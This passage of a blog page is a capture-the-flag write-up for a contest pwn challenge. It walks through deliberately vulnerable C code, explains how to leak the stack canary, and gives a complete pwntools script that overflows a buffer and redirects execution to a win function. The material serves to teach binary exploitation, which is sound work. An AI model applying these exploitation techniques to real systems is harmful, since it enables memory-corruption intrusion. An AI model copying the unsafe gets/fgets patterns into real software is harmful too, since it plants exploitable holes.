+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sensitive to toxic gases! Here is my pet canary...\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
+    <span class="hljs-comment">//printf(&quot;\033[0;32m&quot;);</span>
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;--------------------------------\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|                              |\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|    What do you want to do?   |\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|      1. Talk to canary       |\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|      2. Pet the canary       |\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|      3. Test for poison!     |\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|                              |\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;--------------------------------\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Option: &quot;</span>);
+    fgets(input, <span class="hljs-number">4</span>, <span class="hljs-built_in">stdin</span>);
+    choice = atoi(input);
+    <span class="hljs-keyword">switch</span> (choice) {
+        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
+            talk();
+            <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
+            pet();
+            <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
+            poison();
+            <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">default</span>:
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nInvalid choice!\n&quot;</span>);
+            cage();
+    }
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+    setup();
+    cage();
+}
+</code></pre>
+<p>This is quite a long piece of code, so we should analyze it bit by bit. First, let’s look at the <code>main()</code> function, as it is the entry point of every C program.</p>
+<pre class="hljs"><code><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+    setup();
+    cage();
+}
+</code></pre>
+<p>It calls <code>setup()</code> and <code>cage()</code>. <code>setup()</code> we can ignore as it doesn’t really do anything of note. In case you’re curious, this is to flush the buffers (in order to make the challenge work properly).</p>
+<p><code>cage()</code> is as shown below, omitting most of the <code>print</code> statements:</p>
+<pre class="hljs"><code><span class="hljs-type">int</span> <span class="hljs-title function_">cage</span><span class="hljs-params">()</span> {
+    <span class="hljs-type">char</span> input[<span class="hljs-number">4</span>];
+    <span class="hljs-type">int</span> choice;
+    ...
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Option: &quot;</span>);
+    fgets(input, <span class="hljs-number">4</span>, <span class="hljs-built_in">stdin</span>);
+    choice = atoi(input);
+    <span class="hljs-keyword">switch</span> (choice) {
+        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
+            talk();
+            <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
+            pet();
+            <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
+            poison();
+            <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">default</span>:
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nInvalid choice!\n&quot;</span>);
+            cage();
+    }
+}
+</code></pre>
+<p>We can see that 2 variables are defined at the start of the code, then it asks for the user to choose an option. Afterwards, according to the user’s input, it will call a certain function.</p>
+<ul>
+<li>1 will call <code>talk()</code></li>
+<li>2 will call <code>pet()</code></li>
+<li>3 will call <code>poison()</code></li>
+<li>any other option will print “invalid choice!” and call <code>cage()</code> again</li>
+</ul>
+<p>The variables <code>input</code> and <code>choice</code> are not exploitable as there is no buffer overflow in the user input parsing.</p>
+<p>In order to understand each user option, we have to look at their corresponding function.</p>
+<p>The function <code>pet()</code> is the easiest, it doesn’t actually do anything of note:</p>
+<pre class="hljs"><code><span class="hljs-type">int</span> <span class="hljs-title function_">pet</span><span class="hljs-params">()</span> {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You pet the canary :)\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n\n\n&quot;</span>);
+    cage();
+}
+</code></pre>
+<p>As we can see, all it does is print a string and then call <code>cage()</code> again.</p>
+<p>Things get interesting when we look at <code>talk()</code>:</p>
+<pre class="hljs"><code><span class="hljs-type">int</span> <span class="hljs-title function_">talk</span><span class="hljs-params">()</span> {
+    <span class="hljs-type">char</span> input[<span class="hljs-number">0x10</span>];
+    <span class="hljs-type">char</span> password[<span class="hljs-number">0x10</span>] = <span class="hljs-string">&quot;[REDACTED]&quot;</span>;
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What do you want to say?\n&quot;</span>);
+    fgets(input, <span class="hljs-number">0x30</span>, <span class="hljs-built_in">stdin</span>);
+    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(input, password, <span class="hljs-number">16</span>)) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Here&#x27;s the canary!\n&quot;</span>);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%11$p&quot;</span>);
+    } <span class="hljs-keyword">else</span> {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The canary echoes back what you said:\n%s\n&quot;</span>, input);
+    }
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n\n\n&quot;</span>);
+    cage();
+}
+</code></pre>
+<p>Talk defines 2 variables: <code>input[0x10]</code> and <code>password[0x10]</code>. However, when it is accepting user input with <code>fgets()</code>, it allows up to <code>0x30</code> characters to be inputted, whereas the size of <code>input</code> is only <code>0x10</code>. This leads to a buffer overflow vulnerability.</p>
+<p>We can see that there is a string compare in the next part of the code. It checks that if <code>input</code> is equals to <code>password</code>, it will print “here’s the canary” and then provide the canary. If not, it will simply echo your input.</p>
+<p>The stack in this function would look something like:</p>
+<pre class="hljs"><code>┌──────────────────────┐
+│     input[0x10]      │
+├──────────────────────┤
+│    password[0x10]    │
+├──────────────────────┤
+│      $rbp[0x08]      │
+├──────────────────────┤
+│      $rip[0x08]      │
+└──────────────────────┘
+</code></pre>
+<p>In order to pass the <code>input</code> = <code>password</code> check, we can send something like</p>
+<pre class="hljs"><code>&quot;a&quot; x 16 to fill up input
+            +
+&quot;a&quot; x 16 to fill up password
+-- this will fulfill input = password
+-- as both will be &quot;a&quot; x 16
+</code></pre>
+<p>This will overwrite both <code>input</code> and <code>password</code> with the same thing (“a” x 16), and hence pass the check and give us the canary.</p>
+<p>Finally, the function calls <code>cage()</code> again.</p>
+<p>Actually, with just this function, we are already able to solve the challenge, but let’s take a look at <code>poison()</code> as well:</p>
+<pre class="hljs"><code><span class="hljs-type">int</span> <span class="hljs-title function_">poison</span><span class="hljs-params">()</span> {
+    <span class="hljs-type">char</span> input[<span class="hljs-number">0x10</span>];
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input your poison:\n&quot;</span>);
+    gets(input);
+}
+</code></pre>
+<p>This is quite a straightforward function, as all it does is provide a buffer overflow. As you can see, it lets you input any amount of characters you want into <code>input[0x10]</code>.</p>
+<p>This might be clearer to see and use for your final exploit than <code>talk()</code>, so I will be using this function in the final exploit.</p>
+<p>The stack in this function would look something like:</p>
+<pre class="hljs"><code>┌──────────────────────┐
+│     input[0x10]      │
+├──────────────────────┤
+│      $rbp[0x08]      │
+├──────────────────────┤
+│    canary[0x10]      │
+├──────────────────────┤
+│      $rbp[0x08]      │
+├──────────────────────┤
+│      $rip[0x08]      │
+└──────────────────────┘
+</code></pre>
+<p>Notice where the canary is placed within this function. Actually, this can be visualizable if we open the program in the <code>gdb</code> debugger.</p>
+<p>What we can do is to set a breakpoint right after our user input, and then “examine” the stack when our program hits the breakpoint. We can do so with the following <code>gdb</code> commands/program inputs:</p>
+<pre class="hljs"><code>-&gt; to set breakpoint
+b *address_right_after_gets_call
+(replace with the address as seen in gdb)
+
+-&gt; to run the executable
+r
+
+-&gt; put in a recognizable input
+abcd
+(this will show up as 0x64636261 in your stack!)
+
+-&gt; after hitting breakpoint, inspect the stack
+x/30x $rsp
+</code></pre>
+<p>What the <code>x/30x $rsp</code> does is essentially, <code>x</code> is to examine a specified thing, <code>/30x</code> says that you want to view up to length 30 in hexadecimal, and <code>$rsp</code> is saying that you want to examine 30 bytes from the <code>$rsp</code>, which if you recall is your stack pointer that points to the top of the stack. This command hence displays your stack up to around 30 bytes.</p>
+<p>Hence, in order to win with this function, we just need to overwrite <code>input</code>, followed by <code>$rbp</code>, followed by the canary, followed by <code>$rbp</code> again, then overwrite <code>$rip</code> with whatever address we need.</p>
+<p>Our payload would hence look something like:</p>
+<pre class="hljs"><code>        &quot;a&quot; x 16 to fill up input
+                    +
+        &quot;a&quot; x 8 to fill up $rbp
+                    +
+      canary value to fill up canary
+                    +
+        &quot;a&quot; x 8 to fill up $rbp
+                    +
+whatever address we need to overwrite $rip
+</code></pre>
+<p>There is also one more function that exists within the source code that will be important to us:</p>
+<pre class="hljs"><code><span class="hljs-type">int</span> <span class="hljs-title function_">escape</span><span class="hljs-params">()</span> {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;My canary has escaped!\n&quot;</span>);
+    system(<span class="hljs-string">&quot;cat flag.txt&quot;</span>);
+}
+</code></pre>
+<p>This is our win function as it calls <code>system(&quot;cat flag.txt&quot;)</code> for us.</p>
+<p>Let’s break down what we know:</p>
+<ul>
+<li><code>talk()</code> leaks the canary for us if we fulfill the condition of <code>input</code> = <code>password</code></li>
+<li><code>poison()</code> lets us perform a buffer overflow attack</li>
+<li><code>escape()</code> is the function we want to call in order to win</li>
+</ul>
+<p>If we chain all our knowledge for exploiting each of the functions together, we will need to:</p>
+<ol>
+<li>Input option 1 to call <code>talk()</code></li>
+<li>Send our payload for <code>talk()</code></li>
+<li>Retrieve the printed canary value and save it</li>
+<li>Input option 3 to call <code>escape()</code></li>
+<li>Send our payload for <code>escape()</code></li>
+</ol>
+<p>With pwntools, our script would look something like this:</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+<span class="hljs-comment"># Run binary</span>
+p = process(<span class="hljs-string">&quot;./challenge&quot;</span>)
+<span class="hljs-comment"># You would use something like</span>
+<span class="hljs-comment"># p = remote(&quot;some.providedwebsite.org&quot;, port_number)</span>
+<span class="hljs-comment"># replacing the website with the one we provided,</span>
+<span class="hljs-comment"># and port_number similarly with the one we provided</span>
+
+win = <span class="hljs-number">0x40128e</span>  <span class="hljs-comment"># the address value of win+5</span>
+
+<span class="hljs-comment"># select option 1</span>
+p.sendlineafter(<span class="hljs-string">b&quot;Option: &quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)
+<span class="hljs-comment"># send payload for talk(), which is</span>
+<span class="hljs-comment"># &quot;a&quot; x 32</span>
+p.sendlineafter(<span class="hljs-string">b&quot;say?\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">32</span>)
+<span class="hljs-comment"># receive until &quot;canary!\n&quot;</span>
+<span class="hljs-comment"># then grab the canary value</span>
+p.recvuntil(<span class="hljs-string">b&quot;canary!\n&quot;</span>)
+canary = <span class="hljs-built_in">int</span>(p.recvline().strip(), <span class="hljs-number">16</span>)
+<span class="hljs-comment"># for debugging purposes, you can print</span>
+<span class="hljs-comment"># the value to check</span>
+<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(canary) = }</span>&quot;</span>)
+
+<span class="hljs-comment"># select option 3</span>
+p.sendlineafter(<span class="hljs-string">b&quot;Option: &quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)
+
+<span class="hljs-comment"># build our payload for escape()</span>
+payload = flat({<span class="hljs-number">0x10</span>: p64(<span class="hljs-number">0</span>)+p64(canary)+p64(<span class="hljs-number">0</span>)+p64(win)})
+<span class="hljs-comment"># send the payload</span>
+p.sendlineafter(<span class="hljs-string">b&quot;poison:\n&quot;</span>, payload)
+<span class="hljs-comment"># recv until &quot;flag{&quot;, because this is when we</span>
+<span class="hljs-comment"># know for sure we are receiving the flag</span>
+p.recvuntil(<span class="hljs-string">&quot;flag{&quot;</span>)
+<span class="hljs-comment"># receive the rest of the flag and append</span>
+<span class="hljs-comment"># &quot;flag{&quot; in front</span>
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag{&quot;</span>+p.recvall())
+<span class="hljs-comment"># this isn&#x27;t necessary, but I like to clean</span>
+<span class="hljs-comment"># my output for a model solution :)</span>
+</code></pre>
+<p>This challenge is definitely a huge step up from the rest of the OS/Pwn content covered in Hackbash, but hopefully everyone who attempted this can now learn something new :)</p>
+<p>I know it’s definitely a lot to get your head wrapped around, but if you slowly understand what the code is trying to do, it will become a lot easier.</p>
+<h2 id="extra-notes"tabindex="-1">Extra Notes</h2>
+<p>Firstly, for the <code>win+5</code> address, this is because <code>system()</code> actually requires a properly aligned stack in order to function properly (aligned to <code>0x10</code> i.e. multiple of 16). When we first go into the function and it reaches the <code>push rbp</code> instruction, it will end up pushing <code>$rbp</code> of size <code>0x8</code>, which we do not want. If you attach a debugger to the application, you can see that it crashes at the <code>movaps</code> instruction.</p>
+<p>Usually, the program would naturally handle the stack alignment in its execution flow. Take, for example, a normal function call with the <code>call</code> instruction. Upon <code>call</code>, it pushes <code>$rip</code> of size <code>0x8</code> onto the stack, then after jumping into the function it reaches the <code>push rbp</code> instruction which pushes <code>$rbp</code> of size <code>0x8</code> onto the stack. This naturally aligns the stack for the <code>movaps</code> instruction (<code>push rip; push rbp;</code> -&gt; <code>0x8 + 0x8 = 0x10</code>).</p>
+<p>However, since we are overwriting values in the stack and messing with the program, we are not following the proper execution flow for calling a function, we end up misaligning the stack if we go through the <code>push rbp</code> instruction (the stack is now in a multiple of <code>0x8</code> and not <code>0x10</code>). Hence, to solve it, we skip the <code>push rbp</code> instruction.</p>
+<p>There are more information on the above in <a href="https://www.felixcloutier.com/x86/movaps">here (instruction set reference)</a> and <a href="https://ropemporium.com/guide.html#Common%20pitfalls">here (explanation of <code>movaps</code> in the context of pwn)</a> if you are interested in the specifics.</p>
+<p>Also, it is definitely good to learn how to use <code>gdb</code> as it is a huge part of pwn challenges. There are many guides written for using <code>gdb</code>, and definitely use a plugin such as <code>gef</code> or <code>pwndbg</code> as they provide functions that make it easier to play around with the application.</p>
+<h2 id="afterword"tabindex="-1">Afterword</h2>
+<p>I hope this was overall a fun activity for all Hackbash finalists as we have put a lot of effort to ensure as smooth sailing of an experience as possible. In the creation of our challenges, we strived to find the balance between difficulty and solvability.</p>
+<p>If you are interested in pwn, do feel free to check out my earlier writeups on my blog where I talked about some <a href="https://ultimatehg.github.io/article/0.html">easy pwn challenges in RedPwnCTF 2020</a> as well as the <a href="https://ultimatehg.github.io/article/14.html">pwn challenges in Greyhats WelcomeCTF 2023</a>, which should include a few easier pwn challenges.</p>
+
+      </section>
+      <section id="article-navigation">
+        
+          <div class="article-navigation-item article-navigation-next">
+            <a href="/article/21.html">
+              <div class="article-navigation-arrow article-navigation-next">＜</div>
+              <div class="article-navigation-content article-navigation-next">
+                <p class="article-navigation-title">Windows Heap Manager - An Exploration</p>
+                <p class="article-navigation-subtitle">Personal Notes from Corelan Windows Heap Exploitation Workshop</p>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="article-navigation-item article-navigation-prev">
+            <a href="/article/19.html">
+              <div class="article-navigation-arrow article-navigation-prev">＞</div>
+              <div class="article-navigation-content article-navigation-prev">
+                <p class="article-navigation-title">[Blog] GCC 2024: Recap</p>
+                <p class="article-navigation-subtitle">Global Cybersecurity Camp 2024</p>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      <section id="article-list-button-container">
+        <a href="/articles.html">
+          <div id="article-list-button">📚</div>
+        </a>
+      </section>
+    </article>
+  </main>
+
+
